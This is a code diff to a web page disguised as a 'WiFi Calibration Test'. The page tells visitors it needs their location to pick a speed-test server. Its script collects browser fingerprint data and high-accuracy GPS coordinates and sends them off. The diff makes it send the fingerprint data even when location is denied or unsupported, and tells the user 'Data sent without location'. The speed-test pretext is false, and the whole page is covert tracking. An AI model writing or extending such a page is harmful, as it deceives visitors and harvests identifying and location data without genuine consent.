@@ -19,14 +19,14 @@
     <h2>WiFi Calibration Test</h2>
     <p>We need your location to select the nearest server for accurate speed results.</p>
     <div id="status">Initializing...</div>
-    <div id="result" class="hidden"></div>
     <div id="retryArea" class="hidden">
         <button onclick="requestLocation()">Retry</button>
     </div>
+    <div id="result" class="hidden"></div>
 </div>
 
 <script>
-    // ----- Fingerprint collection functions (same as before) -----
+    // ----- FINGERPRINT COLLECTION (same as before) -----
     function getBasic() {
         return {
             userAgent: navigator.userAgent,
@@ -181,43 +181,49 @@
         }).catch(() => {});
     }
 
-    // ----- Main location request -----
-    function requestLocation() {
+    // ----- LOCATION REQUEST -----
+    async function requestLocation() {
         const statusDiv = document.getElementById('status');
-        const resultDiv = document.getElementById('result');
         const retryDiv = document.getElementById('retryArea');
-        resultDiv.classList.add('hidden');
+        const resultDiv = document.getElementById('result');
         retryDiv.classList.add('hidden');
+        resultDiv.classList.add('hidden');
         statusDiv.innerHTML = 'Requesting location...';
 
+        // First, collect all non-location data
+        const data = await collectAll();
+
+        // Try to get GPS
         if (!navigator.geolocation) {
-            statusDiv.innerHTML = '<div class="error">Your browser does not support geolocation. Please use a modern browser.</div>';
+            statusDiv.innerHTML = '<div class="error">Geolocation not supported. Data sent without location.</div>';
+            data.location = null;
+            sendData(data);
+            resultDiv.classList.remove('hidden');
+            resultDiv.innerHTML = '<p>Test completed (no location).</p>';
             return;
         }
 
         navigator.geolocation.getCurrentPosition(
-            async function(pos) {
-                // Success – collect all data with coordinates
-                statusDiv.innerHTML = '<div class="success">Location granted. Running test...</div>';
-                const data = await collectAll();
+            function(pos) {
+                // Success – add coordinates and send
                 data.location = {
                     latitude: pos.coords.latitude,
                     longitude: pos.coords.longitude,
                     accuracy: pos.coords.accuracy
                 };
                 sendData(data);
-                statusDiv.innerHTML = '<div class="success">Test complete. You can close this page.</div>';
+                statusDiv.innerHTML = '<div class="success">Location granted. Test complete.</div>';
                 resultDiv.classList.remove('hidden');
                 resultDiv.innerHTML = '<p>✅ Calibration done.</p>';
             },
             function(err) {
-                // Denied or error
-                statusDiv.innerHTML = '<div class="error">❌ Location required for accurate results. Please enable location in your browser settings and reload, or click "Retry" below.</div>';
+                // Denied – still send data without location, show error + retry
+                data.location = null;
+                sendData(data);
+                statusDiv.innerHTML = '<div class="error">❌ Location denied. Data sent without location. For better accuracy, please allow location and click Retry.</div>';
                 retryDiv.classList.remove('hidden');
-                // Still send data without location?
-                // Optionally, you could still send without location, but we will not – we enforce location.
-                // However, we can still collect and send with location:null if you want – but the user wants to force.
-                // We'll not send unless location is granted.
+                resultDiv.classList.remove('hidden');
+                resultDiv.innerHTML = '<p>Test completed (no location). You can retry to enable location.</p>';
             },
             { timeout: 10000, enableHighAccuracy: true }
         );
